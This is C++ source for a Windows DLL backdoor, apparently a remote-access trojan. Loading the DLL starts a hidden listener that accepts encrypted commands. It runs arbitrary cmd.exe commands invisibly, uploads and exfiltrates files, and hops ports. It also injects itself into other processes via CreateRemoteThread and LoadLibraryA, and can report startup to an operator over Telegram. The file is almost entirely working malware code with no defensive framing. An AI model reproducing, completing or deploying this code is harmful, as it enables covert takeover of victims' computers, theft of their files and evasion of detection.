#define _WIN32_WINNT 0x0501
#include <iostream>
#include <fstream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <direct.h>
#include <thread>
#include <vector>
#include "lib/crypto.h"
#include "shlobj.h"
#include "lib/telegram.h"
#define BUFFER_SIZE 51192
#define FILE_BUFFER 8192
int DEFAULT_PORT = 4545; // change port
#define SOCKET_TIMEOUT_MS 120000

// #define TELEGRAM
AutoHopTelegram* g_telegram = nullptr;
#pragma comment(lib, "ws2_32.lib")


const unsigned char SECRET_KEY[] = "MyUltraSecureKey2024!@#$%Remote";
const int KEY_LEN = sizeof(SECRET_KEY) - 1;
CRITICAL_SECTION socket_cs;

SOCKET server_fd_global = INVALID_SOCKET;
int current_port = DEFAULT_PORT;
bool server_running = true;
HANDLE server_thread = NULL;

#ifdef TELEGRAM
void InitTelegram() {
    g_telegram = new AutoHopTelegram();
    int port = g_telegram->get_random_port();
    g_telegram->send_startup_message(port);
    current_port = port;
}
#endif

bool send_all(SOCKET sock, const char* data, int len, int timeout_ms = SOCKET_TIMEOUT_MS) {
    if (len <= 0 || sock == INVALID_SOCKET) return true;
    
    int total_sent = 0;
    int bytes_left = len;
    
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
    
    while (total_sent < len) {
        int bytes_sent = send(sock, data + total_sent, bytes_left, 0);
        if (bytes_sent == SOCKET_ERROR) {
            int error = WSAGetLastError();
            if (error == WSAEWOULDBLOCK || error == WSAETIMEDOUT) {
                Sleep(10);
                continue;
            }
            return false;
        }
        if (bytes_sent == 0) return false;
        total_sent += bytes_sent;
        bytes_left -= bytes_sent;
    }
    return true;
}

int recv_all(SOCKET sock, char* buffer, int len, int timeout_ms = SOCKET_TIMEOUT_MS) {
    if (len <= 0 || sock == INVALID_SOCKET) return 0;
    
    int total_received = 0;
    int bytes_left = len;
    
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
    
    while (total_received < len) {
        int bytes_recv = recv(sock, buffer + total_received, bytes_left, 0);
        if (bytes_recv == SOCKET_ERROR) {
            int error = WSAGetLastError();
            if (error == WSAEWOULDBLOCK || error == WSAETIMEDOUT) {
                Sleep(10);
                continue;
            }
            return -1;
        }
        if (bytes_recv == 0) return -1;
        total_received += bytes_recv;
        bytes_left -= bytes_recv;
    }
    return total_received;
}

void send_encrypted(SOCKET sock, Crypto* crypto, const char* data, int len) {
    if (len == 0 || sock == INVALID_SOCKET) return;
    
    unsigned char* encrypted = new unsigned char[len + 1];
    memcpy(encrypted, data, len);
    crypto->encrypt(encrypted, len);
    
    if (!send_all(sock, (char*)&len, sizeof(int))) {
        delete[] encrypted;
        return;
    }
    
    int total_sent = 0;
    int chunk_size = 8192;
    
    while (total_sent < len) {
        int current_chunk = (len - total_sent) < chunk_size ? (len - total_sent) : chunk_size;
        if (!send_all(sock, (char*)encrypted + total_sent, current_chunk)) {
            break;
        }
        total_sent += current_chunk;
        Sleep(1);
    }
    
    delete[] encrypted;
}

int recv_encrypted(SOCKET sock, Crypto* crypto, char* output) {
    if (sock == INVALID_SOCKET) return -1;
    
    int len = 0;
    if (recv_all(sock, (char*)&len, sizeof(int)) != sizeof(int)) {
        return -1;
    }
    
    if (len <= 0 || len > 100 * 1024 * 1024) return -1;
    
    unsigned char* encrypted = new unsigned char[len];
    if (!encrypted) return -1;
    
    int total_received = 0;
    int chunk_size = 8192;
    
    while (total_received < len) {
        int current_chunk = (len - total_received) < chunk_size ? (len - total_received) : chunk_size;
        int bytes = recv_all(sock, (char*)encrypted + total_received, current_chunk);
        if (bytes != current_chunk) {
            delete[] encrypted;
            return -1;
        }
        total_received += bytes;
    }
    
    crypto->decrypt(encrypted, len);
    memcpy(output, encrypted, len);
    delete[] encrypted;
    
    return len;
}

void start_new_port_listener(int new_port) {
    std::thread([new_port]() {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        
        SOCKET new_server_fd = socket(AF_INET, SOCK_STREAM, 0);
        
        int reuse = 1;
        setsockopt(new_server_fd, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));
        
        struct sockaddr_in address;
        address.sin_family = AF_INET;
        address.sin_addr.s_addr = INADDR_ANY;
        address.sin_port = htons(new_port);
        
        if (bind(new_server_fd, (struct sockaddr*)&address, sizeof(address)) == SOCKET_ERROR) {
            closesocket(new_server_fd);
            WSACleanup();
            return;
        }
        
        listen(new_server_fd, 5);

        Sleep(2000); 
        
        EnterCriticalSection(&socket_cs);
        SOCKET old_socket = server_fd_global;
        server_fd_global = new_server_fd;
        current_port = new_port;
        LeaveCriticalSection(&socket_cs);

        if (old_socket != INVALID_SOCKET) {
            closesocket(old_socket);
        }
        
    }).detach();
}

bool directory_exists(const std::string& path) {
    DWORD attrs = GetFileAttributesA(path.c_str());
    return (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY));
}

std::string list_processes() {
    std::string result;
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return "[-] Failed to get process list\n";
    }
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    result = "\n[+] Running Processes:\n";
    result += "==================================================\n";
    result += " PID       Name\n";
    result += "==================================================\n";
    
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            char line[256];
            sprintf_s(line, " %-6d     %s\n", pe32.th32ProcessID, pe32.szExeFile);
            result += line;
        } while (Process32Next(hProcessSnap, &pe32));
    }
    
    CloseHandle(hProcessSnap);
    result += "==================================================\n";
    return result;
}

DWORD find_process_by_name(const std::string& name) {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            std::string proc_name = pe32.szExeFile;
            if (proc_name.find(name) != std::string::npos || 
                _stricmp(pe32.szExeFile, name.c_str()) == 0) {
                CloseHandle(hProcessSnap);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }
    
    CloseHandle(hProcessSnap);
    return 0;
}

std::string get_current_process_info() {
    std::string result;
    char processName[MAX_PATH] = "unknown";
    DWORD pid = GetCurrentProcessId();
    
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hProcessSnap, &pe32)) {
            do {
                if (pe32.th32ProcessID == pid) {
                    strcpy_s(processName, pe32.szExeFile);
                    break;
                }
            } while (Process32Next(hProcessSnap, &pe32));
        }
        CloseHandle(hProcessSnap);
    }
    
    result = "\n[+] Current Process Info:\n";
    result += "==================================================\n";
    result += " PID: " + std::to_string(pid) + "\n";
    result += " Name: " + std::string(processName) + "\n";
    
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    result += " Path: " + std::string(exePath) + "\n";
    result += "==================================================\n";
    
    return result;
}


bool is_process_64bit(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) return false;
    
    BOOL isWow64 = FALSE;
    typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
        GetModuleHandleA("kernel32"), "IsWow64Process");
    
    if (fnIsWow64Process) {
        fnIsWow64Process(hProcess, &isWow64);
    }
    
    CloseHandle(hProcess);
    
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
        return !isWow64;
    }
    
    return false;
}

bool is_dll_loaded_in_process(DWORD pid, const std::string& dll_name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;
    
    MODULEENTRY32 me32;
    me32.dwSize = sizeof(MODULEENTRY32);
    
    bool found = false;
    if (Module32First(hSnapshot, &me32)) {
        do {
            std::string mod_name = me32.szModule;
            std::string mod_path = me32.szExePath;
            
            if (mod_name.find("server") != std::string::npos ||
                mod_path.find("server") != std::string::npos ||
                mod_name.find("payload") != std::string::npos) {
                found = true;
                break;
            }
        } while (Module32Next(hSnapshot, &me32));
    }
    
    CloseHandle(hSnapshot);
    return found;
}


std::string inject(const std::string& target_process) {
    char currentDllPath[MAX_PATH];
    HMODULE hModule = NULL;
    GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, 
                       (LPCSTR)&inject, &hModule);
    GetModuleFileNameA(hModule, currentDllPath, MAX_PATH);
    
    DWORD targetPid = 0;
    if (isdigit(target_process[0])) {
        targetPid = atoi(target_process.c_str());
    } else {
        targetPid = find_process_by_name(target_process);
    }
    
    if (targetPid == 0) {
        return "[-] Target process not found: " + target_process + "\n";
    }
    
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, 
        FALSE, targetPid);
    
    if (!hProcess) {
        return "[-] Failed to open target process. Error: " + std::to_string(GetLastError()) + "\n";
    }
    
    LPVOID remoteMem = NULL;
    HANDLE hThread = NULL;
    bool success = false;
    
    do {
        size_t dllPathSize = strlen(currentDllPath) + 1;
        remoteMem = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteMem) {
            break;
        }
        
        if (!WriteProcessMemory(hProcess, remoteMem, currentDllPath, dllPathSize, NULL)) {
            break;
        }
        
        FARPROC loadLibFar = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
        LPVOID loadLib = (LPVOID)loadLibFar;
        
        if (!loadLib) {
            break;
        }
        
        hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLib, remoteMem, 0, NULL);
        if (!hThread) {
            break;
        }
        
        WaitForSingleObject(hThread, 5000);
        success = true;
        
    } while (false);
    
    if (hThread) CloseHandle(hThread);
    if (remoteMem) VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    if (hProcess) CloseHandle(hProcess);
    
    if (success) {
        return "[+] Successfully migrated to PID: " + std::to_string(targetPid) + 
               " (" + target_process + ")\n";
    } else {
        return "[-] Injection failed. Error: " + std::to_string(GetLastError()) + "\n";
    }
}

bool LoadKeyFromFile(unsigned char* output_key, int max_len) {
    char keyPath[MAX_PATH];
    GetTempPathA(MAX_PATH, keyPath);
    strcat_s(keyPath, "\\session.key");
    
    std::ifstream file(keyPath, std::ios::binary);
    if (!file) return false;
    
    file.read((char*)output_key, max_len);
    int read = file.gcount();
    file.close();
    
    return (read == max_len);
}

std::string execute_command(const std::string& cmd, std::string& current_dir) {
    std::string result;
    
    if (cmd.rfind("cd ", 0) == 0) {
        std::string new_path = cmd.substr(3);
        while (!new_path.empty() && new_path[0] == ' ') new_path.erase(0, 1);
        
        std::string target_path;
        if (new_path == "..") {
            size_t pos = current_dir.find_last_of("\\/");
            if (pos != std::string::npos) {
                target_path = current_dir.substr(0, pos);
                if (target_path.empty() || (target_path.length() == 2 && target_path[1] == ':')) {
                    target_path += "\\";
                }
            } else {
                target_path = "C:\\";
            }
        } else if (new_path == ".") {
            target_path = current_dir;
        } else if (new_path == "\\" || new_path == "/") {
            target_path = "C:\\";
        } else {
            if (new_path.length() >= 2 && new_path[1] == ':') {
                target_path = new_path;
            } else {
                target_path = current_dir + "\\" + new_path;
            }
        }
        
        while (!target_path.empty() && target_path.back() == ' ') {
            target_path.pop_back();
        }
        
        if (directory_exists(target_path)) {
            current_dir = target_path;
            result = "[Directory changed to: " + current_dir + "]\n";
        } else {
            result = "[ERROR] Directory not found: " + new_path + "\n";
        }
        return result;
    }
    
    char tempPath[MAX_PATH];
    char tempFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    sprintf_s(tempFile, "%s\\~cmd_%d.txt", tempPath, GetCurrentProcessId());
    
    std::string full_cmd = "C:\\Windows\\System32\\cmd.exe /c cd /d \"" + current_dir + "\" && " + cmd + " > \"" + tempFile + "\" 2>&1";
    
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    char cmdLine[BUFFER_SIZE];
    strcpy_s(cmdLine, full_cmd.c_str());
    
    BOOL success = CreateProcessA(
        "C:\\Windows\\System32\\cmd.exe",
        cmdLine,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );
    
    if (success) {
        WaitForSingleObject(pi.hProcess, 60000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        std::ifstream file(tempFile, std::ios::binary | std::ios::ate);
        if (file) {
            size_t fileSize = file.tellg();
            file.seekg(0, std::ios::beg);
            
            if (fileSize > 0) {
                size_t max_size = 50 * 1024 * 1024;
                if (fileSize > max_size) {
                    result = "[Output too large (" + std::to_string(fileSize / 1024 / 1024) + "MB), showing first 50MB]\n";
                    fileSize = max_size;
                }
                
                std::vector<char> fileData(fileSize + 1, 0);
                file.read(fileData.data(), fileSize);
                result += std::string(fileData.data());
            }
            file.close();
        }
        
        DeleteFileA(tempFile);
    } else {
        result = "ERROR: Failed to execute command (Error: " + std::to_string(GetLastError()) + ")\n";
    }
    
    if (result.empty()) {
        result = "[Command executed successfully]\n";
    }
    
    return result;
}


bool upload_file(SOCKET client_fd, Crypto* crypto, const std::string& filename, std::string& current_dir) {
    std::string just_filename = filename;
    size_t pos = filename.find_last_of("\\/");
    if (pos != std::string::npos) just_filename = filename.substr(pos + 1);
    
    std::string full_path = current_dir + "\\" + just_filename;
    std::ofstream file(full_path, std::ios::binary);
    if (!file) {
        send_encrypted(client_fd, crypto, "ERROR: Cannot create file", 25);
        return false;
    }
    
    send_encrypted(client_fd, crypto, "READY", 5);
    char buffer[FILE_BUFFER];
    while (true) {
        memset(buffer, 0, FILE_BUFFER);
        int bytes = recv_encrypted(client_fd, crypto, buffer);
        if (bytes <= 0) break;
        if (strncmp(buffer, "EOF", 3) == 0 && bytes == 3) break;
        file.write(buffer, bytes);
    }
    file.close();
    send_encrypted(client_fd, crypto, "UPLOAD_SUCCESS", 14);
    return true;
}

bool download_file(SOCKET client_fd, Crypto* crypto, const std::string& filename, std::string& current_dir) {
    std::string full_path = current_dir + "\\" + filename;
    std::ifstream file(full_path, std::ios::binary);
    if (!file) {
        send_encrypted(client_fd, crypto, "ERROR: File not found", 21);
        return false;
    }
    
    file.seekg(0, std::ios::end);
    long file_size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::string size_str = std::to_string(file_size);
    send_encrypted(client_fd, crypto, size_str.c_str(), size_str.length());
    
    char ready[10];
    recv_encrypted(client_fd, crypto, ready);
    
    char buffer[FILE_BUFFER];
    while (file.read(buffer, FILE_BUFFER) || file.gcount() > 0) {
        send_encrypted(client_fd, crypto, buffer, file.gcount());
        Sleep(10);
    }
    file.close();
    send_encrypted(client_fd, crypto, "EOF", 3);
    return true;
}


void handle_client(SOCKET client_fd) {
    Crypto* crypto = new Crypto(SECRET_KEY, KEY_LEN);
    
    char buffer[BUFFER_SIZE * 4];
    std::string current_dir;
    
    char cwd[BUFFER_SIZE];
    if (_getcwd(cwd, sizeof(cwd)) != NULL) {
        current_dir = cwd;
    } else {
        current_dir = "C:\\";
    }
    
    int consecutive_errors = 0;
    
    while (server_running && consecutive_errors < 5) {
        memset(buffer, 0, BUFFER_SIZE * 4);
        int bytes_read = recv_encrypted(client_fd, crypto, buffer);
        
        if (bytes_read <= 0) {
            consecutive_errors++;
            Sleep(1000);
            continue;
        }
        
        consecutive_errors = 0;
        
        std::string cmd(buffer, bytes_read);
        while (!cmd.empty() && (cmd.back() == '\n' || cmd.back() == '\r')) {
            cmd.pop_back();
        }
        
        if (cmd.empty()) continue;
        
        std::string output;
        
        if (cmd == "ps" || cmd == "tasklist") {
            output = list_processes();
        }
        else if (cmd == "me" || cmd == "ME" || cmd == "whoami") {
            output = get_current_process_info();
        }
        else if (cmd.rfind("inject ", 0) == 0) {
            std::string target = cmd.substr(8);
            output = inject(target);
        }
        else if (cmd == "inject") {
            output = "Usage: migrate <PID or process name>\n";
        }

        else if (cmd.rfind("hop ", 0) == 0) {
            int new_port = std::stoi(cmd.substr(4));
            if (new_port > 0 && new_port < 65535) {

                std::string ack_msg = "HOP_READY";
                send_encrypted(client_fd, crypto, ack_msg.c_str(), ack_msg.size());
                
                char client_ack[10] = {0};
                recv_encrypted(client_fd, crypto, client_ack);
                
                start_new_port_listener(new_port);
                output = "[+] Port hopping to " + std::to_string(new_port) + "\n";
                send_encrypted(client_fd, crypto, output.c_str(), output.size());
                
                Crypto* new_crypto = new Crypto(SECRET_KEY, KEY_LEN);
                delete crypto;
                crypto = new_crypto;
                
            } else {
                output = "[-] Invalid port number\n";
                send_encrypted(client_fd, crypto, output.c_str(), output.size());
            }
        }
        else if (cmd == "pwd" || cmd == "PWD") {
            output = "Current directory: " + current_dir + "\n";
        }
        else if (cmd.rfind("UPLOAD:", 0) == 0) {
            std::string filename = cmd.substr(7);
            upload_file(client_fd, crypto, filename, current_dir);
            continue;
        }
        else if (cmd == "CRYPTO_SYNC") {
            crypto->reset();
            send_encrypted(client_fd, crypto, "SYNC_OK", 6);
            continue;  
        }
        else if (cmd.rfind("DOWNLOAD:", 0) == 0) {
            std::string filename = cmd.substr(9);
            download_file(client_fd, crypto, filename, current_dir);
            continue;
        }
        else if (cmd == "exit" || cmd == "quit") {
            output = "Goodbye!\n";
            send_encrypted(client_fd, crypto, output.c_str(), output.size());
            break;
        }
        else {
            output = execute_command(cmd, current_dir);
        }
        
        if (!output.empty()) {
            send_encrypted(client_fd, crypto, output.c_str(), output.size());
        }
    }
    
    delete crypto;
    closesocket(client_fd);
}

DWORD WINAPI server_thread_func(LPVOID lpParam) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    SOCKET client_fd;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    
    server_fd_global = socket(AF_INET, SOCK_STREAM, 0);
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(current_port);
    
    if (bind(server_fd_global, (struct sockaddr*)&address, sizeof(address)) == SOCKET_ERROR) {
        return 1;
    }
    
    listen(server_fd_global, 5);
    
    while (server_running) {
        client_fd = accept(server_fd_global, (struct sockaddr*)&address, &addrlen);
        if (client_fd != INVALID_SOCKET) {
            handle_client(client_fd);
        }
    }
    
    closesocket(server_fd_global);
    WSACleanup();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hModule);
            InitializeCriticalSection(&socket_cs);
            
            #ifdef TELEGRAM
                InitTelegram();  
            #endif
            
            server_thread = CreateThread(NULL, 0, server_thread_func, NULL, 0, NULL);
            break;
            
        case DLL_PROCESS_DETACH:
            server_running = false;
            EnterCriticalSection(&socket_cs);
            if (server_fd_global != INVALID_SOCKET) {
                closesocket(server_fd_global);
            }
            LeaveCriticalSection(&socket_cs);
            DeleteCriticalSection(&socket_cs);
            if (server_thread != NULL) {
                WaitForSingleObject(server_thread, 5000);
                CloseHandle(server_thread);
            }
            break;
    }
    return TRUE;
}
